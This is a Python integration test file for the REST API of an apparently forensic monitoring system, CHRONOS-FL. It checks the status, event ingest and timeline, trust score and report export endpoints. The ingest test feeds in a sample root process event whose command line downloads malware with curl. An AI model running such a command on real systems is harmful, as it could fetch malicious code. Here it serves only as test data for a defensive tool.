"""
Integration Tests for CHRONOS-FL REST API Endpoints.
"""

from fastapi.testclient import TestClient
from chronos.api.app import app

client = TestClient(app)


def test_api_status_endpoint():
    response = client.get("/api/status")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "active"
    assert "system" in data


def test_api_events_ingest_and_timeline():
    payload = {
        "event_type": "execve",
        "pid": 4040,
        "ppid": 1,
        "comm": "curl",
        "cmdline": "curl http://test.org/malware",
        "user": "root"
    }
    ingest_res = client.post("/api/events/ingest", json=payload)
    assert ingest_res.status_code == 200

    timeline_res = client.get("/api/timeline")
    assert timeline_res.status_code == 200
    timeline = timeline_res.json()
    assert any(t["pid"] == 4040 for t in timeline)


def test_api_trust_scores_endpoint():
    res = client.get("/api/trust/scores")
    assert res.status_code == 200
    data = res.json()
    assert "ess" in data
    assert "tcs" in data


def test_api_export_report_endpoint():
    res = client.get("/api/export/report")
    assert res.status_code == 200
    report = res.json()
    assert "report_id" in report
    assert "trust_assessment" in report
